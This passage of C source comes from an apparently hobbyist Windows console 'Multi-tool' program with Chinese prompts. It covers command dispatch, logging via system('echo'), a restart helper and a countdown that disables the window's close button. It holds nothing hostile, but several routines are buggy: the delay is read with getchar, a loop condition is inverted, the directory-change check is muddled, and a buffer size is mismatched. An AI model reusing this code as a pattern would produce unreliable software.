					scanf_s("%f", &B);
					if (X == 0 && B == 0)
					{
						printf("X和B不能同时为0。\n");
						therestartover();
					}
					else
					{
						printf("%.2f^%.2f=%.2f\n", X, B, pow(X, B));
						therestartover();
					}
				}
				else
				{
					system("echo @输入:>>.\\logs\\Multi-tool.log");
					system("echo @没有该指令。>>.\\logs\\Multi-tool.log");
					system("cls");
					SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
					printf("没有该指令");
					SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
					printf("。\n");
					therestartover();
				}
			}
			else if (_stricmp(str, "QL") == 0)
			{
				system("echo @输入:QL>>.\\logs\\Multi-tool.log");
				theclean();
				therestartover();
			}
			else if (_stricmp(str, "ZGJ") == 0)
			{
				system("cls");
				printf("请输入您想要在多少时间后关机(单位:S)。\n");
				setshutdownorrestarttime = getchar();
				putchar(setshutdownorrestarttime);
				system("pause");
				AllocConsole();
				{
					printf("系统将在%d秒后关机。\n", setshutdownorrestarttime);
					while (setshutdownorrestarttime < LEAST_COUNTDOWN)
					{
						printf("%d\n", setshutdownorrestarttime);
						setshutdownorrestarttime--;
						Sleep(1000);
					}
					exit(0);
				}
				therestartover();
			}
			else if (_stricmp(str, "TEST") == 0)
			{
				thecountdowndosth("B", "行为", 500, 0);
				therestartover();
			}
			else if (_stricmp(str, "TEST2") == 0)
			{
				char wheretogo[100];
				printf("当前目录为%s。\n", str4);
				printf("请输入目标目录。\n");
				printf("输入：");
				scanf_s("%s", wheretogo, 10);
				if (!(_chdir(wheretogo)) == NULL)
				{
					printf("工作目录修改失败。\n");
					perror("错误原因：");
					therestartover();
				}
				else
				{
					printf("工作目录修改成功。\n");
					printf("当前目录为%s。\n", str4);
					therestartover();
				}
			}
			else
			{
				system("echo @输入:>>.\\logs\\Multi-tool.log");
				system("echo @没有该指令。>>.\\logs\\Multi-tool.log");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
				printf("没有该指令");
				SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
				printf("。\n");
				therestartover();
			}
		}
	}
	return 0;
}
void thetime(void)
{
	system("date /t");
	system("time /t");
}
void therestartover(void)
{
	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
	printf("按");
	SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN);
	printf("任意键");
	SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);
	printf("重启程序");
	SetConsoleTextAttribute(handle, FOREGROUND_INTENSITY | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
	printf("。\n");
	system("echo @按任意键重启程序。>>.\\logs\\Multi-tool.log");
	_getch();
	system("start start.exe");
	Sleep(5000);
}
void theclean(void)
{
}
void thecountdowndosth(char *who, char *whattodo, int num, int least_countdown)
{
	DeleteMenu(GetSystemMenu(GetConsoleWindow(), TRUE), SC_CLOSE, MF_BYCOMMAND);
	DrawMenuBar(GetConsoleWindow());
	system("cls");
	printf("%s将在%d秒后%s。\n", who, num, whattodo);
	while (num > least_countdown)
	{
		printf("%d\n", num);
		num--;
		Sleep(1000);
	}
	exit(0);
}